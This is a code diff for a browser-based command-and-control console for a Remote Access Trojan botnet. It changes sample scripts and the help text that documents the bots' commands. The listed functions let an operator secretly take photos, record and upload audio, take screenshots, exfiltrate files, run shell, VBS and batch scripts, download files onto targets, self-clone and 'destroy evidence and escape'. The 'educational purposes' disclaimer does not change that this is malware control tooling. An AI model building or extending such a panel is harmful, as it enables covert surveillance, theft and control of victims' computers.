@@ -88,7 +88,7 @@ const shakeSpeare = (x, y) => {
    tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Plays a Remote Audio file(mp3).\n// |  Warning: Make sure an audio device is attached.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Play("https://raw.githubusercontent.com/A5H1Q/The-Flying-Dutchman/master/Assets/cena.mp3");\n\n`;
    break;
   case 18:
-   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Displays a Timed messagebox.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Timebox("Message Here..",0,16,4096,"Title..",5000);\n/*\nFormat: X,Y,Z\nX => 0: OK (Default)\n     1: OK, CANCEL\n     2: ABORT, RETRY,IGNORE\n     3: YES, NO, CANCEL\n     4: YES, NO\nY => 16: CRITICAL ICON (Default)\n     32: QUESTION ICON\n     48: WARNING ICON\n     64: INFO ICON\nZ => 0: NORMAL (Default)\n     4096: ALWAYS ON TOP\n*/\n \n`;
+   tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Displays a Timed messagebox.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Timebox("Message Here..",0,16,"Title..",5000);\n/*\nFormat: X,Y\nX => 0: OK (Default)\n     1: OK, CANCEL\n     2: ABORT, RETRY,IGNORE\n     3: YES, NO, CANCEL\n     4: YES, NO\nY => 16: CRITICAL ICON (Default)\n     32: QUESTION ICON\n     48: WARNING ICON\n     64: INFO ICON\n*/\n \n`;
    break;
   case 19:
    tale = `// |======================================================|\n// |  Program-${x}\n// |  Description: Shows Various Dialog boxes.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Info("This is an Información.."); // Info box\nPC.Warn("This is an Warning.."); // Warning box\nPC.Error("This is an Error.."); // Error box\n\n`;
@@ -200,57 +200,81 @@ Last Updated : 24 March 2022
     INTRODUCTION
 -----------------------------------
 
-        This is a browser based implementation of an integrated Environment and an embedded JS Runtime (ace-editor) designed to control Remote Access Trojans (RATs) in a distributed Botnet / RAT Network. The interface is designed to simulate a basic command and control facility for the communication of RATs in the Network. All RATs on the network are pre-programmed to follow the syntax and definitions of this custom language. A few examples are provided in the Wiki section. Permission for use is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.
+        This is a browser based implementation of an integrated Environment and an embedded JS Runtime (ace-editor) designed to control Remote Access Trojans (RATs) in a distributed RAT Network (botnet). The interface is designed to simulate a basic command and control facility for the communication of RATs in a Network. All RATs on the network are pre-programmed to follow a set of built-in functions. A few examples are provided in the Wiki section. Permission for is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.
 
 
- LIST OF BUILT-IN FUNCTIONS
+    PREREQUISITES 
+-----------------------------------
+> Read URL: Used by botnet for Reading commands.
+> Write URL: URL for Writing Instructions.
+> Launch Codes: Access codes for writing previlaged commands.
+
+
+ TARGET SELECTORS
+-----------------------------------------
+1) <b>All()</b> - Select All Available targets.
+2) <b>Class(x)</b> - Selects a Group of Targets. Where 'x' is the Group identifier.
+3) <b>Lock(x)</b> - Select a specific target, Denoted by 'x'
+
+ LIST OF FUNCTIONS
+-------------------------------------
+I) Functions without Arguments: 
 ----------------------------------------------------
-1) All() - Select All Available targets.
-2) Class(x) - Selects a Group of Targets.
-3) Lock(x) - Select Target
+  a) For single systems
+      1) <b>Marco()</b> - Returns Polo if Online
+      2) <b>Details()</b> - Retrieves PC Info
+      3) <b>Log()</b> - Return list of active applications.
+      4) <b>Disk()</b> - Retrieves Disk Info
+      5) <b>Health()</b> - Reports back a RAT's working conditions.
 
-4) Marco() - Returns Polo if Online
-5) Details() - Retrieves PC Info
-6) Log() - Return list of active applications.
-7) Disk() - Retrieves Disk Info
-8) Health() - Reports back a RAT's working conditions.
+  b) For Multiple systems
+      1) <b>Escape()</b> - Destroy Evidence and Escape
+      2) <b>Exit()</b> - End Execution temporarily.
+      3) <b>Revive()</b> - End Hibernation  
+      4) <b>Flash()</b> - Flashes Screen, Visual Indication
+      5) <b>NClone()</b> - Stops Cloning Operations
 
-9) Escape() - Destroy Evidence and Escape
-10) Exit() - End Execution temporarily.
-11) Revive() - End Hibernation  
-12) Flash() - Flashes Screen, Visual Indication
-13) NClone() - Stops Cloning Operations
+II) Functions With Arguments: 
+----------------------------------------------------
+  a) For single systems
+      1) <b>Rename(x)</b> - Renames RAT
+      2) <b>Camera(x)</b> - Captures a Photo
+      3) <b>Mic(x,y)</b> - Records audio and uploads file.
+      4) <b>Tree(x)</b> - Retrieves Directory / Folder structures
+      5) <b>Send(x)</b> - Uploads a File
+      6) <b>Prompt(x)</b> - Prompts user for an input.
+      7) <b>Clone(x,y)</b> - Initiate Clone Operations
 
-14) Rename(x) - Renames RAT
-15) Camera(x) - Captures a Photo
-16) Mic(x) - Records audio for 'x' ms
-17) Tree(x) - Retrieves Directory / Folder structures
-18) Send(x) - Sends a File
-19) Prompt(x) - Prompts user for an input.
-20)- Clone(x,y) - Initiate Clone Operations
+  b) For Multiple systems
+      1) <b>Update(x)</b> - Updates firmware file
+      2) <b>Hibernate(x)</b> -  till date
+      3) <b>Excape(x)</b> - Execute Batch script and Escape()
+      4) <b>Vbs(x)</b> - Runs .VBS Script
+      5) <b>Bat(x)</b> - Runs .Bat Script
+      6) <b>Shell(x)</b> - Runs Shell Commands
+      7) <b>Speak(x)</b> - Text to Speech
+      8) <b>Play(x)</b> - Play a Remote (mp3) Audio File (URL)
+      9) <b>Info(x)</b> - Shows Info box
+      10) <b>Warn(x)</b> - Shows Warning Box
+      11) <b>Error(x)</b> - Shows Error box
+      12) <b>Google(x)</b> - Googles selected Text
+      13) <b>Web(x)</b> - Navigates to 'x' url
+      14) <b>Type(x)</b> - Types custom text
+      15) <b>Screenshot(x)</b> - Takes a Screenshot
+      16) <b>Delay(x)</b> - Pause Execution temporarily for 'x' ms
+      17) <b>Shutdown(x)</b> - Shutsdown the system after 'x' ms"
+      18) <b>Download(x)</b> - Downloads a file onto target.
+      19) <b>ExecuteAt(x)</b> - Executes script at specified time.
+      20) <b>Timebox(x,y)</b> - Shows Msg Box fo 'y' ms
 
-21) Update(x) - Updates self
-22) Hibernate(x) -  till date
-23) Excape(x) - Execute Batch script and Escape()
-24) Vbs(x) - Runs .VBS Script
-25) Bat(x) - Runs .Bat Script
-26) Shell(x) - Runs Shell Commands
-27) Speak(x) - Text to Speech
-28) Play(x) - Play a Remote (mp3) Audio File (URL)
-29) Info(x) - Shows Info box
-30) Warn(x) - Shows Warning Box
-31) Error(x) - Shows Error box
-32) Google(x) - Googles selected Text
-33) Web(x) - Navigates to 'x' url
-34) Type(x) - Types custom text
-35) Screenshot(x) - Takes a Screenshot
-36) Delay(x) - Pause Execution temporarily for 'x' ms
-37) Shutdown(x) - Shutsdown the system after 'x' ms"
-38) Download(x) - Downloads a file onto target.
-39) ExecuteAt(x) - Executes script at specified time.
-40)- Timebox(x,y) - Shows Msg Box fo 'y' ms
 
-Eg: PC.Lock("A01");
+ EXAMPLE
+----------------------------------------------------
+Eg: PC.Lock("A01");<i> // Selects 'A01'</i>
+      PC.Shutdown(4000);<i> // Shutsdown after 4 sec.
+      // See Wiki for more examples</i>
+
+- Happy Hacking 🎉
 
 `;
   } else {
